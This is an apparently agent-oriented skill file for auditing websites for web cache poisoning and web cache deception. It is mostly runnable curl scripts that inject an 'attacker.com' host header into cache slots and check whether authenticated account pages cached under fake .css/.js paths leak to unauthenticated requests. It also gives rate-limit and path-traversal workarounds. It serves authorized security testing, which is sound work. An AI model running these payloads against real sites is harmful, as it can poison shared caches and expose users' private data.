---
name: web-vuln-cache-poisoning
description: Web cache poisoning and web cache deception vulnerability detection
license: MIT
metadata:
  category: web-security
  locale: en
  phase: v1
---

## What this skill does

Detects web cache poisoning and web cache deception vulnerabilities by identifying caching behavior, enumerating unkeyed inputs (headers and parameters), injecting payloads, and verifying whether poisoned responses are served to subsequent requests. Also tests for web cache deception by checking whether authenticated responses are cached and served to unauthenticated users.

## When to use

- When auditing a web application that sits behind a CDN or reverse proxy cache (Varnish, Nginx, Cloudflare, Fastly, Akamai, etc.)
- When testing for unkeyed header injection via `X-Forwarded-Host`, `X-Original-URL`, or `X-Rewrite-URL`
- When investigating parameter cloaking via fat GET requests or semicolon delimiter differences
- When checking whether authenticated pages can be tricked into being cached and served to unauthenticated users

## Prerequisites

- `curl` must be installed
- HTTP/HTTPS access to the target application
- A controlled domain or Burp Collaborator URL for payload injection verification

## Inputs

| Variable | Description | Example |
|----------|-------------|---------|
| `TARGET_URL` | Full URL of the target page or endpoint | `https://www.example.com/` |
| `ATTACKER_DOMAIN` | Attacker-controlled domain for payload injection | `attacker.com` |
| `AUTH_COOKIE` | Session cookie for authenticated requests (cache deception tests) | `session=abc123` |

## Workflow

### Step 1: Detect caching behavior

```bash
TARGET_URL="https://www.example.com/"
ATTACKER_DOMAIN="attacker.com"
AUTH_COOKIE="session=abc123"

echo "=== Step 1: Detect caching behavior ==="
for i in 1 2 3; do
  echo "--- Request $i ---"
  curl -s -I "$TARGET_URL" \
    --max-time 10 \
    -H "Cache-Control: no-cache" \
    2>&1 | grep -iE "^(age|x-cache|cf-cache-status|x-varnish|via|cache-control|etag):"
  sleep 1
done

echo ""
echo "[Analysis]"
echo "  Age: > 0            -> response served from cache"
echo "  X-Cache: HIT        -> cached by CDN/proxy"
echo "  CF-Cache-Status: HIT -> cached by Cloudflare"
echo "  Via: varnish/nginx  -> reverse proxy present"
```

### Step 2: Enumerate unkeyed headers

```bash
echo ""
echo "=== Step 2: Test unkeyed header injection ==="

test_unkeyed_header() {
  local header_name="$1"
  local header_value="$2"
  local label="$3"

  # Use cache-buster to get a fresh cache slot
  local cache_buster
  cache_buster="cb=$(date +%s%N)"

  local sep="?"
  echo "$TARGET_URL" | grep -q "?" && sep="&"

  local bust_url="${TARGET_URL}${sep}${cache_buster}"

  local response
  response=$(curl -s -I "$bust_url" \
    -H "${header_name}: ${header_value}" \
    --max-time 10 2>&1)

  echo "--- [$label] $header_name: $header_value ---"
  echo "$response" | grep -iE "^(location|x-forwarded-host|link|content-location):" | head -5
  echo ""
}

test_unkeyed_header "X-Forwarded-Host"  "$ATTACKER_DOMAIN"          "X-Forwarded-Host"
test_unkeyed_header "X-Original-URL"    "/$ATTACKER_DOMAIN"         "X-Original-URL"
test_unkeyed_header "X-Rewrite-URL"     "/$ATTACKER_DOMAIN"         "X-Rewrite-URL"
test_unkeyed_header "X-Host"            "$ATTACKER_DOMAIN"          "X-Host"
test_unkeyed_header "X-Forwarded-Server" "$ATTACKER_DOMAIN"         "X-Forwarded-Server"
test_unkeyed_header "X-HTTP-Host-Override" "$ATTACKER_DOMAIN"       "X-HTTP-Host-Override"
```

### Step 3: Test header-based cache poisoning

```bash
echo ""
echo "=== Step 3: Verify header-based cache poisoning ==="

# Inject payload into a fresh cache slot, then fetch without the header
CACHE_BUSTER="poison_$(date +%s)"
SEP="?"
echo "$TARGET_URL" | grep -q "?" && SEP="&"
POISON_URL="${TARGET_URL}${SEP}${CACHE_BUSTER}=1"

echo "[+] Poisoning cache slot: $POISON_URL"
curl -s -I "$POISON_URL" \
  -H "X-Forwarded-Host: ${ATTACKER_DOMAIN}" \
  --max-time 10 \
  | grep -iE "^(age|x-cache|cf-cache-status|location|link):"

echo ""
echo "[+] Fetching same URL without injected header (should serve cached response)..."
sleep 2
curl -s -I "$POISON_URL" \
  --max-time 10 \
  | grep -iE "^(age|x-cache|cf-cache-status|location|link):"

echo ""
echo "[!] If Location/Link header still references $ATTACKER_DOMAIN -> POISONED"
```

### Step 4: Test parameter cloaking

```bash
echo ""
echo "=== Step 4: Test parameter cloaking ==="

echo "--- Fat GET (body parameter ignored by cache, used by app) ---"
curl -s -I "$TARGET_URL" \
  -X GET \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data "utm_content=x%26param=injected" \
  --max-time 10 \
  | grep -iE "^(age|x-cache|set-cookie|location):"

echo ""
echo "--- Semicolon delimiter cloaking (?param=normal;injected=x) ---"
SEP="?"
echo "$TARGET_URL" | grep -q "?" && SEP="&"
curl -s -I "${TARGET_URL}${SEP}param=normal;injected=x" \
  --max-time 10 \
  | grep -iE "^(age|x-cache|set-cookie|location):"
```

### Step 5: Test web cache deception

```bash
echo ""
echo "=== Step 5: Test web cache deception ==="

# Authenticated account page with appended static-looking path
ACCOUNT_PAGE="https://$(echo "$TARGET_URL" | sed 's|https\?://||' | cut -d/ -f1)/account"
DECEPTION_URLS=(
  "${ACCOUNT_PAGE}/nonexistent.css"
  "${ACCOUNT_PAGE}/nonexistent.js"
  "${ACCOUNT_PAGE}/logo.png"
  "${ACCOUNT_PAGE}%2Fnonexistent.css"
)

for url in "${DECEPTION_URLS[@]}"; do
  echo "--- Authenticated request to: $url ---"
  curl -s -I "$url" \
    -H "Cookie: $AUTH_COOKIE" \
    --max-time 10 \
    | grep -iE "^(http|age|x-cache|cf-cache-status|cache-control|content-type):" | head -6
  echo ""
done

echo "[+] Now fetch same URLs WITHOUT auth cookie (unauthenticated)..."
for url in "${DECEPTION_URLS[@]}"; do
  echo "--- Unauthenticated request to: $url ---"
  resp=$(curl -s "$url" --max-time 10)
  echo "$resp" | grep -i "account\|username\|email\|profile\|user" | head -3
  if [ -n "$(echo "$resp" | grep -i 'account\|username\|email')" ]; then
    echo "  [CRITICAL] Authenticated data found in unauthenticated response -> WEB CACHE DECEPTION"
  fi
  echo ""
done
```

### Step 6: Verify payload persistence and document impact

```bash
echo ""
echo "=== Step 6: Summary ==="
cat <<'EOF'
Severity guide:
  [CRITICAL] Cache poisoning: attacker controls cached JS/redirect -> XSS or open redirect served to all users
  [CRITICAL] Web cache deception: authenticated user data served to unauthenticated users
  [HIGH]     Unkeyed header reflected in cached response (e.g. X-Forwarded-Host in canonical URL)
  [MEDIUM]   Parameter cloaking enables cache key bypass

Remediation:
  - Add injected headers to cache key or strip them at edge
  - Require cache-busting for authenticated responses (Cache-Control: no-store, private)
  - Validate and normalize Host header server-side
  - Configure cache to differentiate by Content-Type and URL path, not extension only
  - Add Vary header for any header that influences response content
EOF
```

## Done when

- Caching headers (Age, X-Cache, CF-Cache-Status) are recorded for baseline requests
- At least 6 unkeyed header variants are tested
- A cache poisoning attempt is made and the follow-up unauthenticated fetch is compared
- Web cache deception paths with static extensions are tested with and without auth
- Findings are classified by severity

## Failure modes

| Symptom | Cause | Solution |
|---------|-------|----------|
| No caching headers observed | No cache layer present or Cache-Control: no-store enforced | Confirm via Shodan/headers that a CDN is in use; test from multiple IPs |
| Cache poisoning not persisting | Cache TTL too short or per-IP caching | Increase request rate or test from a different IP without the injected header immediately after |
| Web cache deception returns 404 | App rejects unknown paths under account page | Try path traversal variants: `/account/../account.css`, `/account;.css` |
| 429 rate limiting | Too many requests | Add `sleep 2` between requests or use `-x` with a proxy |

## Notes

- Always obtain written authorization before testing; cache poisoning affects all users sharing the cache.
- Use a unique cache-buster query parameter for each test run to avoid polluting results with prior tests.
- Web cache deception is documented in detail by Omer Gil: https://omergil.blogspot.com/2017/02/web-cache-deception-attack.html
- For automated scanning, consider `web-cache-vulnerability-scanner` (https://github.com/PortSwigger/web-cache-vulnerability-scanner) via Burp Suite.
- Cloudflare caches by file extension by default; appending `.css` or `.js` to authenticated paths is a reliable deception vector.
